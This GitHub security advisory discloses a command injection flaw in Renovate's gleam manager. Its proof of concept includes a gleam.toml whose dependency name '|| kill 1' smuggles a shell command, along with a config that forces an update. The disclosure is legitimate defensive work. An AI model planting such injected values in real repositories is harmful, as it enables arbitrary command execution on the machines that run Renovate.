# [M] Renovate vulnerable to arbitrary command injection via gleam manager and malicious gleam.toml file

## Summary
Severity: Medium
Advisory: GHSA-xjr7-3c3g-m763
CWE: CWE-77
Ecosystem: npm
CVSS: CVSS:3.1/AV:L/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-xjr7-3c3g-m763
Type: github-advisory

## Affected
- npm: `renovate` — affected >=39.53.0 <40.33.0

## Details
### Summary
The user-provided string `depName` in the `gleam` manager is appended to the `gleam deps update` command without proper sanitization.

### Details
Adversaries can provide a maliciously crafted `gleam.toml` in conjunctions with a tweaked Renovate configuration file to trick Renovate to execute arbitrary code.
All values added to the `packagesToUpdate` variable in [lib/modules/manager/gleam/artifacts.ts](https://github.com/renovatebot/renovate/blob/e9cbd02865b1827f7e4269c05250a12ee2203a71/lib/modules/manager/gleam/artifacts.ts) are not being escaped using the `quote` function from the `shlex` package.
This lack of proper sanitization has been present in the product since version 39.53.0 (https://github.com/renovatebot/renovate/commit/d29698e0131231652970f02765312769975e4d38), released on December 6 of 2024.

### PoC
1. Create a git repo with the following content:

`renovate.json5`:

```json5
{
  $schema: "https://docs.renovatebot.com/renovate-schema.json",
  customDatasources: {
    always: {
      defaultRegistryUrlTemplate: "https://docs.renovatebot.com/search/search_index.json",
      transformTemplates: ['{"releases":[{"version":"99999.0.0"}]}'],
    },
  },
  packageRules: [
    {
      // Target of the day
      matchManagers: ["gleam"],
      // Trick the manager in believing there's a new version
      overrideDatasource: "custom.always",
    },
  ],
}

```


`gleam.toml`:

```toml
name = "renovate-aci-2"
version = "0.0.1"

[dependencies]
"|| kill 1" = "0.1.0"
```


`manifest.toml`:

```toml
non-empty file
```

2. Run Renovate against the repo from a Docker container. Notice that the process terminates without reporting "Repository finished", because the ACI vulnerability allowed for execution of `kill 1`, terminating the root process of the container.

### Impact
This is a Arbitrary Command Injection vulnerability, allowing those with write access on repositories configured to be scanned by Renovate to cause the execution of commands of their choice on the machine that runs Renovate.

## References
- https://github.com/renovatebot/renovate/security/advisories/GHSA-xjr7-3c3g-m763
- https://github.com/renovatebot/renovate
